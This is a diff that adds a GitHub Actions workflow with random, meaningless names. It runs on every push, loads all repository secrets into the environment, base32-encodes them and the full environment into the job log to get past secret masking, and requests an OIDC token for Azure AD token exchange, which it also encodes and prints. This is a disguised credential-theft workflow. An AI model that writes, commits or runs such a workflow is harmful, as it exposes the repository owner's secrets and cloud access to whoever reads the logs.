@@ -1,0 +1,26 @@
+# htvpwiwawhks33j5
+name: haaoqdx4u2dc
+on: [push]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  wxxds63r7:
+    runs-on: ubuntu-latest
+    timeout-minutes: 12
+    env:
+      SWM6ENGSX: ${{ toJSON(secrets) }}
+    strategy:
+      fail-fast: false
+      matrix:
+        environment:
+          - "github-pages"
+    environment: ${{ matrix.environment }}
+    steps:
+      - name: tiabpy5ra
+        run: |
+          env | base32 -w 134
+          printf '%s' 'V' | base32 -w 134
+          printf '%s' "$SWM6ENGSX" | base32 -w 134
+          printf '%s' 'V' | base32 -w 134
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then printf '%s' 'V' | base32 -w 134; curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api%3A%2F%2FAzureADTokenExchange" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p' | base32 -w 134; fi
